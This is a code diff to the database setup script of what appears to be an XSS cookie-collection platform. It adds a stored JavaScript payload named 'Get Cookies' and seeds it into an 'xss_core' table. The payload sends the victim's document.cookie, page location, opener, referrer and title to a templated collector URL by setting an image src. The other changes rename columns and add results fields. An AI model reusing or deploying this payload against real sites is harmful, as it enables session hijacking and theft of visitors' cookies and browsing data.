@@ -1,5 +1,22 @@
 import sqlite3
 from lib.settings import db_path
+from lib.utils import now
+
+get_cookie = """
+var x=new Image();
+try
+{
+var myopener='';
+myopener=window.opener && window.opener.location ? window.opener.location : '';
+}
+catch(err)
+{
+}
+x.src='{{ now_path }}?id={{ id }}&location='+escape(document.location)+'&toplocation='+escape(top.document.location)+'&cookie='+escape
+
+(document.cookie)+'&opener='+escape(myopener)+'&referrer='+escape(document.referrer)+'&title='+escape(document.title);
+"""
+
 
 db = sqlite3.connect(db_path)
 
@@ -18,7 +35,7 @@ db.execute("""
         name char(50) not null,
         type integer not null,
         owner integer not null,
-        create_date char(50) not null
+        created_date char(50) not null
     )
 """)
 
@@ -27,7 +44,9 @@ db.execute("""
     create table project_results (
         id integer not null primary key autoincrement,
         project_id integer not null,
-        raw_data longtext default null
+        raw_data longtext default null,
+        server_data longtext default null,
+        got_time char(50) default null
     )
 """)
 
@@ -37,9 +56,18 @@ db.execute("""
         id integer not null primary key autoincrement,
         name char(50) not null,
         script longtext default null,
-        type integer not null default 0,
+        owner integer not null default 0,
         fields longtext default null
     )
 """)
 
-#add some data of xss-scripts and test account. todo
+
+db.execute('insert into xss_core(name, script, fields) values (?, ?, ?)', ('Get Cookies', get_cookie,
+           'location,toplocation,cookie,opener,referrer,title'))
+
+db.execute('insert into projects(name, type, owner, created_date) values (?, ?, ?, ?)',
+           ('test', 1, 1, now()))
+
+db.commit()
+db.close()
+#todo add some data of xss-scripts and test account.
